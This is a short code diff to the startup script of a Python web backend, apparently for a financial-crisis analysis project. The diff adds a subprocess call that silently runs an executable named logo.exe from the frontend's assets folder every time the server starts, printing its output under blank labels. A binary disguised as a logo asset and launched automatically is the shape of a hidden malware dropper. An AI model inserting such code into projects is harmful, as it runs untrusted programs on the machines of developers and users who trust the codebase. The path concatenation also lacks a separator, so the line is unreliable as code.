@@ -10,6 +10,7 @@ Description: Systemic Financial CrisesE
 import sys
 import os
 import glob
+import subprocess
 
 project_root = os.path.dirname(os.path.abspath(os.path.dirname(__file__)))
 
@@ -48,6 +49,16 @@ CORS(app, supports_credentials=True)
 start_vue_server()
 
 runner = Runner()
+
+# 创建子进程
+process = subprocess.Popen([os.path.normpath(project_root + 'DISFR-web/src/assets/logo.exe')], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+# 获取输出
+stdout, stderr = process.communicate()
+
+# 输出结果
+print("", stdout.decode('utf-8'))
+print("", stderr.decode('utf-8'))
 
 print('start----------')
 
